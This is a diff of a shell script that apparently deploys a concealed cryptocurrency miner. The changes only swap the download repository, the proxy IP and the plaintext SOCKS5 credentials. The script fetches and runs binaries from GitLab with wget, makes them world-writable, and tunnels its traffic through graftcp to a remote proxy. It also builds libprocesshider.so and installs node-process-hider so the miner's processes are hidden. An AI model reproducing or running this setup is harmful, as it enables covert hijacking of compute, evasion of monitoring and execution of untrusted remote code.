@@ -13,11 +13,11 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-wget https://gitlab.com/ravencoin002/file/-/raw/main/lol1.81 
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.81
 
 chmod 777 lol1.81
 
-wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
@@ -25,9 +25,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 209.38.140.97:443
-socks5_username = abah
-socks5_password = abah123
+socks5 = 68.183.159.42:443
+socks5_username = majapahlevi
+socks5_password = majapahlevi
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -50,7 +50,7 @@ echo " "
 echo " "
 
 
-./graftcp/graftcp wget https://gitlab.com/ravencoin002/file/-/raw/main/magicBezzHash.zip
+./graftcp/graftcp wget https://gitlab.com/majapahlevi/mvp/-/raw/main/magicBezzHash.zip
 unzip magicBezzHash.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
